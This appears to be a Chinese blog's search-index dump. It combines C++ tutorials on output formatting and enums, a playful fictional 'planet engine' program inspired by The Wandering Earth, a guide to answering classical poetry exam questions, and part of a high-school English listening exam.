&lt;&lt; std::endl;    std::cout &lt;&lt; &quot;Scientific: &quot; &lt;&lt; std::scientific &lt;&lt; num &lt;&lt; std::endl;    return 0;&#125;\n\n3. setw用于设置下一个输出字段的宽度。\n#include &lt;iostream&gt;#include &lt;iomanip&gt;int main() &#123;    int num = 42;    std::cout &lt;&lt; &quot;Default width: &quot; &lt;&lt; num &lt;&lt; std::endl;    std::cout &lt;&lt; &quot;Width 10: &quot; &lt;&lt; std::setw(10) &lt;&lt; num &lt;&lt; std::endl;    return 0;&#125;\n\n4. setfill用于设置填充字符，通常与 setw 一起使用。\n#include &lt;iostream&gt;#include &lt;iomanip&gt;int main() &#123;    int num = 42;    std::cout &lt;&lt; &quot;Default fill: &quot; &lt;&lt; std::setw(10) &lt;&lt; num &lt;&lt; std::endl;    std::cout &lt;&lt; &quot;Fill with &#x27;*&#x27;: &quot; &lt;&lt; std::setfill(&#x27;*&#x27;) &lt;&lt; std::setw(10) &lt;&lt; num &lt;&lt; std::endl;    return 0;&#125;\n\n5. left, right, internal用于设置字段的对齐方式。left 左对齐，right 右对齐，internal 使得填充字符在符号和数字之间（主要用于科学计数法）。\n#include &lt;iostream&gt;#include &lt;iomanip&gt;int main() &#123;    double num = -123.456;    std::cout &lt;&lt; &quot;Default align: &quot; &lt;&lt; std::setw(15) &lt;&lt; num &lt;&lt; std::endl;    std::cout &lt;&lt; &quot;Left align: &quot; &lt;&lt; std::left &lt;&lt; std::setw(15) &lt;&lt; num &lt;&lt; std::endl;    std::cout &lt;&lt; &quot;Right align: &quot; &lt;&lt; std::right &lt;&lt; std::setw(15) &lt;&lt; num &lt;&lt; std::endl;    std::cout &lt;&lt; &quot;Internal align (scientific): &quot; &lt;&lt; std::scientific &lt;&lt; std::internal &lt;&lt; std::setw(15) &lt;&lt; num &lt;&lt; std::endl;    return 0;&#125;\n\n6. boolalpha 和 noboolalpha用于控制布尔值的输出格式。boolalpha 使布尔值以 true 或 false 输出，而 noboolalpha 使其以 1 或 0 输出。\n#include &lt;iostream&gt;#include &lt;iomanip&gt;int main() &#123;    bool flag = true;    std::cout &lt;&lt; &quot;Default bool: &quot; &lt;&lt; flag &lt;&lt; std::endl;    std::cout &lt;&lt; &quot;Boolalpha: &quot; &lt;&lt; std::boolalpha &lt;&lt; flag &lt;&lt; std::endl;    std::cout &lt;&lt; &quot;Noboolalpha: &quot; &lt;&lt; std::noboolalpha &lt;&lt; flag &lt;&lt; std::endl;    return 0;&#125;\n\n7. showbase 和 noshowbase用于控制是否显示数值的基数前缀（如八进制的 0，十六进制的 0x）。\n#include &lt;iostream&gt;#include &lt;iomanip&gt;int main() &#123;    int num = 255;    std::cout &lt;&lt; &quot;Default base: &quot; &lt;&lt; num &lt;&lt; std::endl;    std::cout &lt;&lt; &quot;Hexadecimal with showbase: &quot; &lt;&lt; std::hex &lt;&lt; std::showbase &lt;&lt; num &lt;&lt; std::endl;    std::cout &lt;&lt; &quot;Hexadecimal without showbase: &quot; &lt;&lt; std::hex &lt;&lt; std::noshowbase &lt;&lt; num &lt;&lt; std::endl;    return 0;&#125;\n\n8. uppercase 和 nouppercase用于控制十六进制和八进制数值的输出是否使用大写字母。\n#include &lt;iostream&gt;#include &lt;iomanip&gt;int main() &#123;    int num = 255;    std::cout &lt;&lt; &quot;Default hex: &quot; &lt;&lt; std::hex &lt;&lt; num &lt;&lt; std::endl;    std::cout &lt;&lt; &quot;Uppercase hex: &quot; &lt;&lt; std::hex &lt;&lt; std::uppercase &lt;&lt; num &lt;&lt; std::endl;    std::cout &lt;&lt; &quot;Lowercase hex: &quot; &lt;&lt; std::hex &lt;&lt; std::nouppercase &lt;&lt; num &lt;&lt; std::endl;    return 0;&#125;\n\n这些操纵器可以通过组合使用，以满足各种格式化需求。记住，操纵器通常只对下一个输出操作有效，除非显式地重置。\n\n在C++中，如果你想要为整个程序或某个特定作用域内的输出设置统一的格式，你可以通过修改流对象（如std::cout）的格式状态来实现。这些修改通常是临时的，除非你显式地保存并恢复这些状态，或者使用某些全局设置方法（尽管C++标准库并不直接提供全局设置所有输出的方法）。\n以下是一些控制输出格式的方法，这些方法可以在一定程度上实现全局或持久化的效果：\n\n使用std::ios_base的静态成员函数：虽然std::ios_base提供了设置和获取格式状态的静态成员函数（如sync_with_stdio），但它们并不直接用于格式化输出。这些函数主要用于控制C++流与C标准I&#x2F;O库之间的同步。\n\n创建自定义的流对象：你可以创建一个自定义的流对象，并设置其格式状态。然后，在你的程序中使用这个自定义的流对象进行输出。这种方法的好处是你可以在不同的作用域或模块中轻松地重用这些设置。\n#include &lt;iostream&gt;#include &lt;iomanip&gt;std::ostream&amp; my_cout = std::cout; // 实际上，这里只是引用了std::cout// 或者，你可以创建一个stringstream或其他ostream派生类的对象int main() &#123;    // 设置自定义流的格式状态    my_cout &lt;&lt; std::fixed &lt;&lt; std::setprecision(2);    // 使用自定义流进行输出    double num = 123.456789;    my_cout &lt;&lt; &quot;Formatted output: &quot; &lt;&lt; num &lt;&lt; std::endl;    // 注意：这里my_cout实际上是std::cout的引用，所以它的设置会影响到std::cout    // 如果你不想影响std::cout，应该创建一个独立的ostream对象    return 0;&#125;\n\n注意：在上面的例子中，my_cout实际上是std::cout的引用，所以对它所做的任何修改都会影响到std::cout。如果你想要一个独立的流对象，你应该创建一个std::ostringstream或其他std::ostream派生类的对象。\n\n使用函数封装格式设置：你可以编写一个函数，该函数接受一个流对象和必要的格式参数，并设置流对象的格式状态。然后，在你的程序中调用这个函数来设置输出格式。\n#include &lt;iostream&gt;#include &lt;iomanip&gt;void set_output_format(std::ostream&amp; os, int precision = 2) &#123;    os &lt;&lt; std::fixed &lt;&lt; std::setprecision(precision);&#125;int main() &#123;    set_output_format(std::cout);    double num = 123.456789;    std::cout &lt;&lt; &quot;Formatted output: &quot; &lt;&lt; num &lt;&lt; std::endl;    return 0;&#125;\n\n","categories":["c/c++","c/c++头文件"],"tags":["cpp"]},{"title":"iostream头文件","url":"/2024/10/15/c%E2%81%84c++/iostream%E8%AF%B4%E6%98%8E/","content":"iostream库提供了丰富的功能来控制输出的格式。以下是一些使用iostream库控制输出格式的方法：\n1. 主要类：\nstd::istream：用于输入操作的抽象基类，提供了基本的输入功能。\nstd::ostream：用于输出操作的抽象基类，提供了基本的输出功能。\nstd::iostream：继承自std::istream和std::ostream，用于同时进行输入和输出操作。\nstd::cin：标准输入流对象，通常与键盘关联，用于接收用户输入。\nstd::cout：标准输出流对象，通常与屏幕关联，用于向用户显示信息。\nstd::cerr：标准错误输出流对象，不带缓冲，用于输出错误信息。\nstd::clog：标准日志流对象，带缓冲，用于输出日志信息。\n\n2. 常用操作符：\n&gt;&gt;：输入操作符，用于从输入流中读取数据。\n&lt;&lt;：输出操作符，用于将数据写入输出流。\n\n3. 基本用法：\n标准输入和输出：通过std::cout输出信息，通过std::cin读取用户输入，实现基本的交互功能。\n标准错误输出：使用std::cerr输出错误信息，不带缓冲，立即显示在屏幕上。\n标准日志输出：使用std::clog输出日志信息，带缓冲，可以与其他输出分开处理。\n\n4. 格式化输出：\n使用&lt;iomanip&gt;库对输出进行格式化，包括设置宽度、精度和对齐方式。\nstd::setprecision(int n)：设置浮点数的输出精度为n位小数。\nstd::setw(int n)：设置输出的最小宽度为n个字符，不足部分用空格填充。\nstd::left和std::right：设置输出内容的对齐方式，分别为左对齐和右对齐。\n\n5. 流的状态检查：\n可以检查输入输出流的状态，以确定操作是否成功。\n使用std::cin.fail()检查输入操作是否失败，若失败则输出错误信息。\n\n6. 处理字符串输入：\n使用std::getline函数读取包含空格的整行输入，适用于读取较长的字符串或包含空格的输入。\n\n7. 综合应用：\n在实际编程中，可以将以上功能综合应用，实现复杂的输入输出处理。\n例如，通过读取用户输入的数据，进行一系列计算后，将结果格式化输出到屏幕上。\n\n","categories":["c/c++","c/c++头文件"],"tags":["cpp"]},{"title":"春节十二响","url":"/2023/01/21/c%E2%81%84c++/%E6%98%A5%E8%8A%82%E5%8D%81%E4%BA%8C%E5%93%8D/","content":"春节十二响事先声明一下：    这是李一一写的，木星事件之后，经过党委批准和李一一的同意，我把它传到了这里；    #env最开始是行星引擎专用编译器引入的指令，c23这个最新标准也采纳了这个编译指令；    如果编译不成功，请确保你的编译器是最新，并且行星引擎sdk也是最新的。\n// File: twelve_biubiu.c// Permission: CN-2082-2// Author: Li.YiYi// Dept: PE-362, UG// Origin: TI-352132// 春节十二响 biu biu biu!#env &quot;planet_engine&quot;int init() &#123;    set_engine_number_mask(ENGINE_ALL);    set_fuel_level(FUEL_FULL);    // 允许误差10秒以内    if (unix_time() &lt; make_unix_time(2082, 1, 28, 23, 59, 60-10)) return ERR_ENGIN_ENV;    return engine_check_init(); // after compile and before real run&#125;int main() &#123;    set_curve(CURVE_NATURAL); // 自然曲线耗费燃料最少    for (int i = 0, 12, 1) &#123;        engine_start();        wait_engine(ENGINE_STATE_CHANGE);        sleep(2000);        engine_stop();        wait_engine(ENGINE_STATE_CHANGE);        sleep(4000); // 这个时长在模拟器里听起来更像心跳    &#125;    return 0;&#125;int final() &#123;    engine_ensure_shutdown();&#125;\n","categories":["c/c++"],"tags":["c","流浪地球"]},{"title":"enum","url":"/2024/11/05/c%E2%81%84c++/%E6%9E%9A%E4%B8%BE%E7%B1%BB%E5%9E%8Benum/","content":"在C++中，enum（枚举）是一种用户定义的类型，它允许程序员为整型值指定更易读的名字。枚举类型主要用于表示一组命名的整数常量，使得代码更加清晰和易于维护。\n定义枚举你可以使用enum关键字来定义一个枚举类型。下面是一个简单的例子：\n#include &lt;iostream&gt;enum Color &#123;    RED,    GREEN,    BLUE&#125;;int main() &#123;    Color myColor = RED;    if (myColor == RED) &#123;        std::cout &lt;&lt; &quot;The color is red.&quot; &lt;&lt; std::endl;    &#125;    return 0;&#125;\n\n在这个例子中，Color是一个枚举类型，它有三个可能的值：RED、GREEN和BLUE。\n枚举的底层实现默认情况下，枚举值从0开始递增。因此，在上面的例子中，RED的值为0，GREEN的值为1，BLUE的值为2。你也可以显式地指定枚举值：\nenum Color &#123;    RED = 1,    GREEN = 2,    BLUE = 4&#125;;\n\n在这个修改后的例子中，RED的值为1，GREEN的值为2，BLUE的值为4。\n枚举类型的使用枚举类型可以用于变量声明、函数参数和返回值等。例如：\n#include &lt;iostream&gt;enum Direction &#123;    NORTH,    SOUTH,    EAST,    WEST&#125;;Direction getOppositeDirection(Direction dir) &#123;    switch (dir) &#123;        case NORTH:            return SOUTH;        case SOUTH:            return NORTH;        case EAST:            return WEST;        case WEST:            return EAST;        default:            return NORTH; // 默认返回北方向，虽然这里不会发生    &#125;&#125;int main() &#123;    Direction currentDirection = EAST;    Direction oppositeDirection = getOppositeDirection(currentDirection);    if (oppositeDirection == WEST) &#123;        std::cout &lt;&lt; &quot;The opposite direction of EAST is WEST.&quot; &lt;&lt; std::endl;    &#125;    return 0;&#125;\n\n枚举类（C++11及以后）C++11引入了enum class，它提供了更强的类型安全和作用域控制。与普通的枚举不同，enum class的枚举值不会隐式地转换为整数，也不会与其他枚举类型相互转换。\n#include &lt;iostream&gt;enum class Season &#123;    SPRING,    SUMMER,    AUTUMN,    WINTER&#125;;int main() &#123;    Season currentSeason = Season::SPRING;    if (currentSeason == Season::SPRING) &#123;        std::cout &lt;&lt; &quot;The current season is spring.&quot; &lt;&lt; std::endl;    &#125;    // 下面的代码会导致编译错误，因为Season::SPRING不能隐式转换为int    // int seasonValue = Season::SPRING; // 错误    return 0;&#125;\n\n在这个例子中，Season是一个enum class类型，它的值（如Season::SPRING）必须显式地使用Season::前缀来引用。\n总结\n枚举（enum）提供了一种定义命名整数常量的方法。\n枚举值默认从0开始递增，但也可以显式指定。\nenum class（C++11及以后）提供了更强的类型安全和作用域控制。\n\n","categories":["c/c++"],"tags":["cpp"]},{"title":"古诗词鉴赏主要题型及其答题方法","url":"/2023/01/01/dc/%E5%8F%A4%E8%AF%97%E8%AF%8D%E9%89%B4%E8%B5%8F%E4%B8%BB%E8%A6%81%E9%A2%98%E5%9E%8B%E5%8F%8A%E5%85%B6%E7%AD%94%E9%A2%98%E6%96%B9%E6%B3%95/","content":"古诗词鉴赏主要题型及其答题方法考点一、人物形象典型考题：请结合全诗，简要分析诗人的形象？考题解读：这类考题，在对诗人形象进行概括后，要注意结合具体诗句来进行分析。另外，诗人在诗中的形象可能并不单一，所以要全面分析。答题方法：⑴条分缕析，分条分点。⑵性格在前，解析在后（结合具体诗句）。⑶把握意象，分析情感态度。诗词导引：竹轩诗兴 张镃柴门风卷却吹开，狭径初成竹旋栽。梢影细从茶碗入，叶声轻逐篆烟来。暑天倦卧星穿过，冬昼闲吟雪压摧。预想此时应更好，莫移墙下一株梅。[注]篆烟：盘香。因盘香曲绕如篆文，故称。问题：请结合全诗，简要分析诗人的形象。答题示例：塑造了闲适、洒脱、高雅的诗人形象。①闲适。通过对“竹轩”“柴门”“狭径”等简朴清幽的生活环境的描写，表现了诗人日常生活的闲适自得；②洒脱。“倦卧”“闲吟”等反映了诗人洒脱的生活态度；③高雅。“竹”“雪”“梅”等意象表现出诗人高雅的人生志趣。母题迁移：送郑十八虔贬台州司户，伤其临老陷贼之故，阙为面别，情见于诗⑴郑公樗散鬓成丝，酒后常称老画师。万里伤心严谴日，百年垂死中兴时。苍惶已就长途往，邂逅无端出饯迟。便与先生应永诀，九重泉路尽交期。问题：作品中抒情主人公是个怎样的形象？请简要分析。\n考点二、分析情感意境：典型考题：这首诗词（诗句）营造了一种怎样的意境？表达了诗人怎样的思想情感？考题分析：这是诗词鉴赏中最常见的一种题型。诗人借助诗中的意象（物象），构建出令人想象的境界，进而寄托自己的情感。也因此，该题型答题时，景、境、情三方面，缺一不可。答题步骤：⑴用自己的语言描绘诗中展现的图景画面（忠实于原诗，用想象、联想加以再创造）。⑵用两个双音节词概括景物所营造的氛围特点（如：孤寂冷清、恬静优美、雄浑壮阔、萧瑟凄凉等）。⑶分析作者的思想感情（切忌空洞，答出因什么而产生这种感情）。推荐模板：①这首诗词（诗句）描绘了……的画面（图景）；②营造（渲染）出一种……的意境（氛围），表达了（表现了）诗人因……（而产生的）……的感情。诗词导引：绝句二首（其一）   杜甫迟日江山丽，春风花草香。泥融飞燕子，沙暖睡鸳鸯。注：此诗写于杜甫经过“一岁四行役”的奔波流离之后，暂时定居成都草堂时。问题：此诗描绘了怎样的景象？表达了诗人怎样的感情？答题示例：①这首诗描绘了一派美丽的初春景象：阳光普照，四野青绿，江水映日，春风送香，泥融土湿，燕子衔泥筑巢，日丽沙暖，鸳鸯沙洲静卧。②营造出一种明净绚丽的意境，表现了诗人因为结束颠沛流离、暂得安定生活而产生的愉悦闲适的感情。母题迁移：清平乐●弹琴峡题壁    纳兰性德泠泠彻夜，谁是知音者。如梦前朝何处也，一曲边愁难写。   极天关塞云中，人随雁落西风。唤取红巾翠袖，莫教泪洒英雄。注：弹琴峡：在西北居庸关内，两山相峙，水流石搏，声若弹琴。 泠泠：水流声。问题：这首词描写了怎样的边塞景象？有什么作用？\n考点三、分析艺术手法：典型考题：这首诗词（诗句）用了怎样的表现手法？或，请从表现技巧（艺术手法）的角度，分析诗人是怎样抒发自己的情感的？考题分析：艺术手法在诗歌中，是诗人用以抒发感情的手段方法，又叫表现手法。在诗词中，表现手法可分为抒情手法、描写手法、修辞手法三类。抒情手法有直抒胸臆和间接抒情两种。间接抒情又分为借景抒情、托物言志、托物寓理等。描写方法主要有：衬托（正衬和反衬）；虚实结合（联想和想象）；动静结合；对比等。修辞手法在古诗词中常见的有：比兴手法；比喻；拟人；夸张；双关；用典；反语等。答题步骤：⑴点出用了何种手法。⑵结合诗句阐释作者是怎样运用这种手法的。⑶此手法传达出诗人怎样的感情。推荐模板：①这首诗词（诗句）采用了……的表现手法（修辞手法等）；②……写出了XX（物象）的……特点；③表现出了（突出了）诗人因……而产生的……思想感情。诗词导引：早   行    陈与义露侵驼褐晓寒轻，星斗阑干分外明。寂寞小桥和梦过，稻田深处草虫鸣。问题：此诗主要运用了什么表现手法？有何效果？答题示例：①该诗主要用了反衬手法。②天未放亮，用星斗分外明亮反衬夜色的黑暗，“草虫鸣”反衬出环境的寂静。③两处反衬都突出了诗人因出行之早，心中漂泊而引起的孤独寂寞之情。母题迁移：半山春晚即事    王安石春风取花去，酬我以清阴。翳翳陂路静，交交园屋深。床敷每小息，杖屦或幽寻。唯有北山鸟，经过遗好音。注：床敷：安置坐具。杖屦：扶杖漫步。问题：结合全诗，简要分析尾联“唯有北山鸟，经过遗好音”运用的艺术手法。\n考点四、分析语言特色：典型考题：这首诗在语言上有何特色？或，请分析这首诗的语言风格（语言艺术）。考题分析：这种考题是要品味整首诗表现出来的语言风格。常用来答题的词语有：悲壮慷慨、清新明丽、朴实无华、明白晓畅、生动形象、幽默讽刺、多用口语、委婉含蓄、雄浑豪放、华美绚丽、婉约细腻等。答题步骤：⑴用一两个词语点明语言特色。⑵用诗中有关语句具体分析这种特色。⑶指出表现了诗人怎样的感情。推荐模板：①这首诗用语……（朴实无华、雄浑豪放等）。②示例……（诗中的语句或物象），写出（表明）了XX（诗人、主人公或诗中某物象）……的行为（特点）；③通过这种语言风格非常生动（自然、强烈等）地表现了XX（诗人或主人公）……的感情。诗词导引：春    怨    盖嘉运打起黄莺儿，莫教枝上啼。啼时惊妾梦，不得到辽西。问题：请分析这首诗的语言特色。答题示例：①该诗语言清新自然，很口语化。②“黄莺儿”儿化音，显出女子的纯真娇憨。“啼时惊妾梦，不得到辽西”，质朴的语言表明了打黄莺儿是它惊扰了自己思念丈夫的美梦。③通过这种语言风格，非常自然地表现了女子对丈夫的思念之情。母题迁移：宫 词梨花风动玉阑香，春色沉沉锁建章。唯有落红官不禁，尽教飞舞出宫墙。问题：从语言风格角度赏析这首诗。\n考点五、析词炼句：典型考题一：某联中最生动传神的是什么字？为什么？考题分析：古人写诗作词，历来讲究字词句的锻炼，我们在品味这些词句时，不能把该词句孤立起来谈，要放在诗句中，结合全诗全词的意境情感来分析。答题步骤：⑴解释该字词在句中的含义。⑵展开联想，把该字词放入原句中描述景象。⑶点出该字词烘托的意境或表达的感情。推荐模板：①“XX”词（句）在诗中……（解释或手法）。……（该词句在诗中的场景描述）。②“XX”词（句）营造出一种……的意境\\淋漓尽致（生动传神）地表现了……的情感。诗词导引：南浦别    白居易南浦凄凄别，西风袅袅秋。一看肠一断，好去莫回头。问题：“看”字看似平常，实际上非常传神，你认为好在哪里？答题示例：①“看”字在诗中指回头望。离人孤独地走了，泪眼朦胧，还频频回望，每一次回望，都令自己肝肠寸断。②全诗只一“看”字，就淋漓尽致地表现了抒情主人公离别的酸楚。母题迁移：和李上舍冬日书事    韩驹北风吹日昼多阴，日暮拥阶黄叶深。倦鹊绕枝翻冻影，飞鸿摩月堕孤音。推愁不去如相觅，与老无期稍见侵。顾藉微官少年事，病来那复一分心。注：这首诗是作者因获罪被贬分宁县令时所作。问题：试分析“倦”“堕”两字的炼字效果。\n典型考题二：诗中某句历来为人称道，请赏析。答题步骤：该题型需从手法、内容（情感）、结构、语言（包括炼字、语言风格）、特殊的阅读效果几方面考虑。诗词导引：雨中再赋海山楼①陈与义②百尺阑干横海立，一生襟抱与山开。岸边天影随潮入,楼上春容带雨来。慷慨赋诗还自恨,徘徊舒啸却生哀。灭胡猛士今安有?非复当年单父台③。【注】①作者曾登过海山楼,写过《登海山楼》一诗。②陈与义:南宋爱国诗人，后期诗风雄浑沉郁。③单父台,指宓子贱琴台。孔丘的学生宓子贱，曾作单父宰，鸣琴而治，政绩斐然,后人思之,因名其弹琴之高台日琴台。杜甫《昔游》诗说“昔者与高李,晚登……是时仓廪实,洞达寰区开。猛士思灭胡，将帅望三台。君王无所惜，驾驭英雄……”，描写唐玄宗时的盛世景象。问题：有人认为本诗颔联颇为精妙,请结合具体诗句赏析其精妙之处。答题示例：①动静结合,“天影”“春容”是静态,“人”“来”两个动词则写天光云影与春日气象,使整个境界为之飞动。②远近结合,“天影”是远景,“海潮”“楼台”“春雨”是近景,写景富有层次。③此联不仅雄浑壮阔，而且以这种潮水奔涌、风雨齐来的危楼景象反映了时代的动荡和诗人的不安,为后两联抒情做铺垫。母题迁移：虞美人·大光祖席，醉中赋长短句陈与义①张帆欲去仍搔首，更醉君家酒。吟诗日日待春风，及至桃花开后却匆匆。歌声②频为行人咽，记著樽前雪③。明朝酒醒大江流，满载一船离恨向衡州④。【注】①建炎三年腊月，陈与义与友人席益(字大光)在衡山相遇。当时，陈与义因躲避金兵而抵达湖南，席益则卸掉官职流寓衡山一带。次年元旦后数日，陈与义离开衡山赴邵阳，在席益为他举办的饯别宴上作此词。②歌声：席间歌女劝酒的演唱。③雪：指“雪儿”。雪儿为隋末李密歌伎，善歌舞，能够根据音律填词而歌。“雪儿”后来泛指歌伎。④衡州：今湖南衡阳。问题:请简要赏析词的末尾两句“明朝酒醒大江流，满载一船离恨向衡州”的妙处。\n考点六、品析诗眼典型考题：某字（词）是全诗（词）的关键，为什么？或，找出这首诗词的“诗眼”，试作简要赏析。考题解读：古诗词讲究构思，往往一个字（词）就是构成全诗的线索、奠定全诗的感情基调（思想）。在做这种题时，表达的过程要完整，明确重点，表达要用语准确通畅。答题步骤：⑴点明该字（词）对突出主旨所起的作用。⑵分析该字（词）在诗的结构或情感上的作用。推荐模板：①本诗以“XX”为诗眼，……（主旨作用）。②首联\\第一句……；③颔联\\第二句……；④颈联\\尾联\\末句……  （结构上或情感上的作用）。诗词导引：葛溪驿   王安石缺月昏昏漏未央，一灯明灭照秋床。病身最觉风露早，归梦不知山水长。坐感岁时歌慷慨，起看天地色凄凉。鸣蝉更乱行人耳，正抱疏桐叶半黄。问题：诗人的心绪集中体现在“乱”字上，全诗是怎样表现的？答题示例：①本诗以“乱”字为诗眼，情景交融，抒写了诗人的家国之思。②首联借残月沙漏、灯光昏暗暗写诗人心烦意乱；③颔联直接写身体之病、羁旅之困、怀乡之愁，点明“乱”的原因；④颈联用衬托手法，借助疏桐蝉鸣将诗人的烦乱渲染到极致。母题迁移：丹阳送韦参军   严维丹阳郭里送行舟，一别心知两地秋。日晚江南望江北，寒鸦飞尽水悠悠。问题：这首诗的关键词是什么，为什么？\n考点七、谈观点说理由典型考题：关于这首诗（词），有人这样认为，有人那样认为，你如何评价？考题解读：这类考题，一定要依据原诗词句作答，从原诗词句中找理由、原因。答题步骤：⑴做判断。⑵条分缕析（结合原诗，找句中要点，翻译描述诗歌情境）。诗词导引：菩萨蛮 李白平林漠漠烟如织，寒山一带伤心碧。暝色入高楼，有人楼上愁。   玉阶空伫立，宿鸟归飞急。何处是归程？长亭更短亭。问题：关于这首词的内容，有人认为是“游子思归乡”，有人认为是“思妇盼归人”，你的看法如何？请谈谈你的理由。答题示例：（一）我同意“游子思乡归”。①词的一、二句是写游子眼前所见之景；②三至六句是游子触景生情，设想家人盼望自己归去的情景；③最后两句游子感叹旅途漫漫，归乡无期，更添愁苦。（二）我认为是“思妇盼归人”。①词的上片写思妇见晚景而生愁情；②五六句描思妇伫立玉阶，见鸟归而怀念异乡之人；③最后两句绘思妇幻想游人归途艰难，感叹相逢无期。母题迁移：题郑防画夹五首（其一） 黄庭坚惠崇烟雨归雁，坐我潇湘洞庭。欲唤扁舟归去，故人言是丹青。注：郑防，画的收藏者。画夹，分页装潢的画册。惠崇，北宋僧人，画家，擅画雁、鹅、鹭鸶及水乡景色。潇湘，指湘江。问题：有古人批评这首诗说，要别人提醒后作者才想起眼前只是一幅画，这“太过夸张了”，你如何认为？请简要说明理由。\n考点八、比较作者情感心境典型考题一：两首诗（词），作者表达的情感（心境）有何不同？请简要分析。考题解读：比较两首诗词的情感，需要抓住诗词中的主要意象。分析它们之间传达出的不同情绪。答题步骤：⑴分别点出两手诗词作者的情感（心境）。⑵结合原诗词，描述诗词中的主要意象是如何传递作者的情绪的。诗词导引：宿济州西门外旅馆    晁端友寒林残日欲栖乌，壁里青灯乍有无。小雨愔愔人假寐，卧听疲马啮残刍。宿渔家     郭震几代生涯傍海涯，两三间屋盖芦花。灯前笑说归来夜，明月随船送到家。问题：两首诗同为旅途所见所感，诗人表达的情感有何不同？请简要分析。答题示例：①晁诗表现了诗人旅途中所感受到的孤单寂寞、前路茫然之情。“寒林残日”、乌鸦归巢、油灯明灭，营造出冷清的气氛，从“假寐”“卧听”的动作可见诗人深夜难以入眠，体现了诗人孤寂、纷乱惆怅的情绪。②郭诗表现了诗人旅途中住宿渔家所感受到温暖愉悦之情。灯前笑说，描绘出渔人待客的热情，主客间无拘无束、愉快交谈的情景，体现了诗人在渔家感受到的温暖愉悦。母题迁移：忆王孙  赠别    沈凝之西窗昨夜是清秋，星汉迢迢只一舟。读罢《离骚》不自由，望牵牛，半束折花算酒筹。忆王孙   赠别     商鋆西风红叶下江潮，忍看浮名一笔消。强把愁情付浊醪，读《离骚》，拍遍栏杆是寂寥。问题：两首词都写到“读《离骚》”，但表现的心情有所不同，请简要分析。\n典型考题二：这首诗（词），包含了哪些复杂的感情？试简要分析。考题解读：这类题，需要结合具体诗句分析其中包含的情感。答题方法：⑴条分缕析，分条分点；⑵情感在前，解析在后；⑶结合诗人在诗中对国、对家、对亲、对民、对友、对己（包括青春年华、理想追求）、对风物（包括山川河流、田园风光）。诗词导引：琐窗寒    周邦彦暗柳啼鸦，单衣伫立，小帘朱户。桐花半亩，静锁一庭愁雨。洒空阶、夜阑未休，故人剪烛西窗语。似楚江瞑宿，风灯零乱，少年羁旅。迟暮，嬉游处，正店舍无烟，禁城百五。旗亭唤酒，付与高阳俦侣。想东园、桃李自春，小唇秀靥今在否？到归时、定有残英，待客携尊俎。问题：这首词情感复杂微妙，除表达“对羁旅生活的厌倦”外，你认为作者还表达了哪些情感？试简要分析。答题示例：①对故友的怀念。“故人剪烛西窗语”句，化用李商隐诗句，表明作者希望有朝一日能与故人相逢，述说相思之情。②对年华流逝的痛惜。“迟暮，嬉游处，正店舍无烟”句，将过去嬉游热闹与今日的萧瑟冷清对比，表达出年华已逝的“迟暮”之感。③对家乡的思念。“想东园、桃李自春”句，借想象“东园”桃李花开的景象，表达了对家乡的思念之情。④对情人的眷恋。“小唇秀靥今在否”描绘了姑娘娇美的容貌，表达了作者的眷恋之意。母题迁移：临江仙     陈与义忆昔午桥桥上饮，坐中多是豪英。长沟流月去无声。杏花疏影里，吹笛到天明。二十馀年如一梦，此身虽在堪惊。闲登小阁看新晴。古今多少事，渔唱起三更。问题：此词中包含哪些复杂的情感？请简要分析。\n","categories":["dc资料"],"tags":["语文"]},{"title":"高2021级英语试卷（一）","url":"/2022/12/13/dc/%E9%AB%982021%E7%BA%A7%E8%8B%B1%E8%AF%AD%E8%AF%95%E5%8D%B7%EF%BC%88%E4%B8%80%EF%BC%89/","content":"高2021级英语试卷（一）满分150分 考试时间：120分钟第 I 卷第一部分 听力(共两节，满分30分)第一节(共5小题；每小题1.5分，满分7.5分)听下面5段对话。每段对话后有一个小题,从题中所给的A、B、C,三个选项中选出最佳选项，并标在试卷的相应位置。听完每段对话后，你都有10秒钟的时间来回答有关小题和阅读下一小题。每段对话仅读一遍。1.How does the man know Greg?A. He is in the same class with Greg. B. He met Grey in Sweden.  \tC. He teaches Greg physics.2. What does the man suggest the woman do?A. Use a different plug.\t\t\tB. Buy a new television. \t\tC. Try to repair the old television.3. What does the man think about the new airport?A. It’ s far away.              \t\t\tB. It’ s  noisy.             \t\tC. It’ s  crowded.4. What kind of morning meal does the man prefer?A. A simple meal.            \t\t\tB. A sweet meal.           \t\tC. A large meal5. Where are the speakers?A. At a supermarket.          \t\tB. At a flower shop        \t\tC. At a drugstore.\n第二节 (共15小题；每小题1.5分，满分22.5分)听下面5段对话或独白。每段对话或独白后有几个小题，从题中所给的A、B、C三个选项中选出最佳 选项，并标在试卷的相应位置。听完每段对话或独白前，你将有时间阅读各个小题，每小题5秒钟；听完后，各小题将给出5秒钟的作答时间。每段对话或独白读两遍。请听第6段材料，回答6至7题。6.What will the woman do for Thanksgiving?A. Work at a store.\t\tB. Go to her grandparents’ house.\tC. Attend a festival in the evening.7. Why does the man refuse the woman’s offer?A. He doesn’ t want to cook.B. He will be out ofenergyC. He received an invitation elsewhere.请听第7段材料，回答8至10题。8.Why did the girl switch language classes?A. Her class was too easy.B. Her mother asked her to do it.C. Her interests were in another language.9. Which language is the boy trying to learn?A. Spanish.               \t\t\t\tB. German.                \t\t\tC. Italian.10. What will the boy probably do to practice what he is learning?A. Speak to his relatives.      \t\tB. Listen to the teacher.         \t\tC. Study the class material.请听第8 段材料 ， 回答第 11 至 13 题 。11.What is the probable relationship between the speakers?A. Father and daughter.       \t\tB. Tourist and guide.           \t\tC. Reporter and explorer.12. What was the most difficult part on the mountain according to the man?A. The ice was dangerous.     \t\tB. The snow was deep          \t\tC. The rocks were small.13. How long does it take most people to climb up and down the mountain?A. 6 hours.                 \t\t\tB. 12 hours.                  \t\t\tC. 15 hours.请听第9段材料，回答第14至17题。14.What are the speakers mainly talking about?A. An activity.            \t\t\tB. A person.                  \t\t\tC. A problem.15. What happened two weeks ago?A. The woman bought a dryer.B. The dryer started to work poorly.C. The company fixed the dryer.16. How much did people use to pay to use the dryer perfectly?A. $2.           \t\t\t\t\tB. $3.            \t\t\t\t\tC. $4.17.What will Joe probably do first this afternoon?A. Check the dryer.         \t\t\tB. Replace the dryer.          \t\tC. Repair the dryer.请听第10段材料，回答18至20题。18.Who would be on the top of the tower probably?A. Women.                \t \t\tB. Men.                      \t\t\tC. Children.19. How many people were in the largest tower?A. 10.         \t\t\t\t\tB.14.          \t\t\t\t\tC. 40.20. What is the purpose of the event?A. To celebrate teamwork.   \t\tB. To show strength.            \t\tC. To break a record.\n第二部分 